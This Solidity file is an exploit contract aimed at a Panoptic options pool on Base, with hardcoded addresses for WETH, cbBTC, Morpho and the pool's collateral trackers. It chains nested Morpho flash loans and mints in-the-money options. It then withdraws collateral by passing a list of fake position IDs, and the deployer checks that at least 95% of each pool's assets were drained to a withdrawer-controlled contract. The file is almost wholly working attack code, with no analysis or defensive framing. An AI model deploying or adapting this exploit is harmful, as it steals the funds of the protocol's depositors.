// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.13;

import "./Interfaces.sol";
import {TokenId} from "@types/TokenId.sol";

contract WETH_cbBTC30bpsBaseAttacker_Deployer {
    WETH_cbBTC30bpsBaseAttacker public attacker;
    IERC20Partial token0 = IERC20Partial(address(0x4200000000000000000000000000000000000006)); // weth
    IERC20Partial token1 = IERC20Partial(address(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf)); // cbbtc
    ICollateralTracker tracker0 = ICollateralTracker(address(0x535BD2C411Cd9b8faE39a66BCb79065CC6255103));
    ICollateralTracker tracker1 = ICollateralTracker(address(0x49b4A3297152EEd8965bee50B7b3b381F8c321cf));
    constructor(address _withdrawer) {
        (uint256 poolAssets0Before, , ) = tracker0.getPoolData();
        (uint256 poolAssets1Before, , ) = tracker1.getPoolData();
        attacker = new WETH_cbBTC30bpsBaseAttacker(_withdrawer);
        attacker.takeFlashLoanAndAttack();
        uint256 attackerBalance0 = token0.balanceOf(address(attacker));
        uint256 attackerBalance1 = token1.balanceOf(address(attacker));
        require(attackerBalance0 >= (poolAssets0Before * 95) / 100);
        require(attackerBalance1 >= (poolAssets1Before * 95) / 100);
    }
}

contract WETH_cbBTC30bpsBaseAttacker is IMorphoFlashLoanCallback {
    uint256[] fake_token_uints = [16932343400165264, 17035745045722363, 16993655162578412, 17009206836208441, 16939609024273842, 17107685890532457, 17083582814389265, 16898430492320797, 17101708812844843, 16927858255610090, 17069357979992109, 16980362901391387, 17003795739444277, 17101378560687335, 17026568887818250, 17029994500126407, 16936522326425929, 17082751614160489, 17063366226512834, 17097157113273900, 17066504289794370, 17119504401467382, 17034803466092545, 17114928340284497, 17025612530710537, 16954544221541041, 16904132411153761, 16949521359855531, 16911017735677536, 17085189125086153, 16914178675719633, 17126645520732798, 17074540876198711, 17119951603807036, 17119329401324348, 17018492495701600, 17058114656058193, 16999873957325411, 16892817363524338, 17049620233322987, 17097995700960721, 17142266941213954, 17089567784803601, 16910690735799991, 17073996118339521, 17073485236538696, 16969179392893693, 17067919565309087, 17008221870292762, 17126049222761791, 17142166672779123, 17144420237880467, 16927713925256617, 16934049758747081, 16894635486029112, 16923138720850302, 16963022048440415, 16992964215424125, 16896222394180792, 16969369082248421, 17052541747857150, 17074313683106350, 17063547626636328, 17038292193577029, 16975851747102136, 17004266512915538, 17130759040409663, 17114800599387293, 17138198303696334, 16908147932247101, 16894658434788774, 17139615699826370, 16938993875545352, 17072849265831395, 17017661774688634, 17118102226994995, 16908153974732775, 16913597968133068, 16988465729292003, 17014445553286162, 16894355756410939, 16967923632426531, 16895531852075711, 17129841125473381, 17099849001593597, 17021555222469713, 17020691157262149, 16897926812058864, 17154365982004348, 17044600072961146, 16988827310790466, 17064714233413875, 17045419378318324, 16956101523846221, 17050277920000050, 17032253897074887, 16972156248137231, 16894109815048865, 17072588196537057, 17140315683590255, 17029938928325889, 17151127052636987, 17094514593261230, 16888769806416760, 17050369048063491, 16972063987353239, 17029065097821193, 16990649632113938, 17060232259853742, 16913491436315882, 16900114985532166, 16993502753544935, 17167047696388934, 17157376839885919, 16968143087326031, 17022685737634914, 16991628369728980, 17087643854683771, 17094346387673542, 16970073014124536, 16943603167087332, 3437866335631248550078689307201264, 3437866335631248550078689307201264];

    // On base
    IERC20Partial token0 = IERC20Partial(address(0x4200000000000000000000000000000000000006)); // weth
    IERC20Partial token1 = IERC20Partial(address(0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf)); // cbbtc
    IMorpho morpho = IMorpho(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));

    ICollateralTracker tracker0 = ICollateralTracker(address(0x535BD2C411Cd9b8faE39a66BCb79065CC6255103));
    ICollateralTracker tracker1 = ICollateralTracker(address(0x49b4A3297152EEd8965bee50B7b3b381F8c321cf));
    IPanopticPool pp = IPanopticPool(address(0x000005A05A34fa3bbb6C158ad843beA80657BaaA));

    int24 constant MIN_V3POOL_TICK = -887272;
    int24 constant MAX_V3POOL_TICK = 887272;

    address private immutable withdrawer;

    bool private executed = false;

    constructor(address _withdrawer) {
        withdrawer = _withdrawer;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == withdrawer, "Only constructor-supplied withdrawer can call this function");
        _;
    }

    function takeFlashLoanAndAttack() public {
        require(!executed);
        // take flash loan
        (uint256 poolAssets0, , ) = tracker0.getPoolData();
        (uint256 poolAssets1, , ) = tracker1.getPoolData();
        {
            // Initiate first flash loan for token0
            uint256 borrowAmount0 = 2 * poolAssets0;
            // Encode the token1 borrow amount for the nested loan
            bytes memory data = abi.encode(borrowAmount0, 2 * poolAssets1, true);
            morpho.flashLoan(address(token0), borrowAmount0, data);
        }
        executed = true;
    }

    uint256 private token0Amount; // Store for nested callback
    function onMorphoFlashLoan(
        uint256 amount,
        bytes calldata data
    ) external override {
        require(!executed);

        (uint256 amount0, uint256 amount1, bool isFirstLoan) =
                    abi.decode(data, (uint256, uint256, bool));

        if (isFirstLoan) {
            // Store token0 amount for later
            token0Amount = amount0;

            // Initiate nested flash loan for token1
            bytes memory nestedData = abi.encode(amount0, amount1, false);
            morpho.flashLoan(address(token1), amount1, nestedData);

            // After the nested callback completes, approve token0 repayment
            token0.approve(address(morpho), amount0);
        } else {
            // This is the nested (token1) flash loan callback
            // We now have both tokens - execute the attack
            drainPool();

            // Approve token1 repayment for the nested loan
            token1.approve(address(morpho), amount1);
        }
    }

    function drainPool() internal {
        // - deposit funds
        (uint256 attackAmount0, , ) = tracker0.getPoolData();
        (uint256 attackAmount1, , ) = tracker1.getPoolData();
        token0.approve(address(tracker0), type(uint104).max);
        token1.approve(address(tracker1), type(uint104).max);

        tracker0.deposit(uint128(token0.balanceOf(address(this))), address(this));
        tracker1.deposit(uint128(token1.balanceOf(address(this))), address(this));

        // - mint ITM options
        // TODO: Insert real positions
        TokenId[] memory posIdList = new TokenId[](1);
        posIdList[0] = TokenId.wrap(3767409381624928637814587149146);
        TokenId[] memory posIdList2 = new TokenId[](2);
        posIdList2[0] = TokenId.wrap(3767409381624928637814587149146);
        posIdList2[1] = TokenId.wrap(2535301209956549043867245497178);

        // --- for Asset 0
        pp.mintOptions(
            posIdList, // positionIdList
            uint128(attackAmount0), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // --- for Asset 1
        pp.mintOptions(
            posIdList2, // positionIdList
            uint128(attackAmount1), // positionSize (half of the pool assets)
            0, // effectiveLiquidityLimitX32
            MIN_V3POOL_TICK, // tickLimitLow
            MAX_V3POOL_TICK // tickLimitHigh
        );

        // ---------------------------------------------------------------------
        // - withdraw funds with fake position list

        // Create a list of positions that don't exist
        TokenId[] memory fakeTokenIdList = generateTokenIdListFromFakeTokenUints();

        // Now use the list of positions that don't exist

        // 1. calculate how much I can withdraw
        uint256 intermediateBalance0 = tracker0.balanceOf(address(this));
        uint256 toWithdraw0 = tracker0.convertToAssets(intermediateBalance0);
        // 2. withdraw with fake list
        tracker0.withdraw(toWithdraw0, address(this), address(this), fakeTokenIdList);

        // repeat for token1
        uint256 intermediateBalance1 = tracker1.balanceOf(address(this));
        uint256 toWithdraw1 = tracker1.convertToAssets(intermediateBalance1);
        tracker1.withdraw(toWithdraw1, address(this), address(this), fakeTokenIdList);

        // now liquidate my own position and repeat...
        // NOTE: Now that we execute the attack with a single drainPool, no need to do this - just
        // leave the uncollateralised positions open
        /* TokenId[] memory emptyTokenList = new TokenId[](0);
        pp.liquidate(emptyTokenList, address(this), posIdList2); */
    }

    function generateTokenIdListFromFakeTokenUints() internal view returns (TokenId[] memory fakeTokenIdList) {
        fakeTokenIdList = new TokenId[](fake_token_uints.length);
        for (uint16 i = 0; i < fake_token_uints.length;) {
            fakeTokenIdList[i] = TokenId.wrap(fake_token_uints[i]);
            unchecked {
              ++i;
            }
        }
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function withdraw(address tokenAddress, uint256 amount) external onlyWithdrawer {
        if (tokenAddress == address(0)) {
            // Withdraw ETH
            require(address(this).balance >= amount, "Insufficient ETH balance");
            (bool success, ) = payable(withdrawer).call{value: amount}("");
            require(success, "ETH transfer failed");
        } else {
            // Withdraw ERC20 token
            IERC20Partial token = IERC20Partial(tokenAddress);
            require(token.balanceOf(address(this)) >= amount, "Insufficient token balance");
            token.transfer(withdrawer, amount); // revert if token transfer fails
        }
    }

    // Required to receive ETH when unwrapping WETH
    receive() external payable {
        // Accept ETH from WETH unwrapping
    }

    // Fallback for any other ETH transfers
    fallback() external payable {
        // Handle unexpected ETH transfers
    }
}
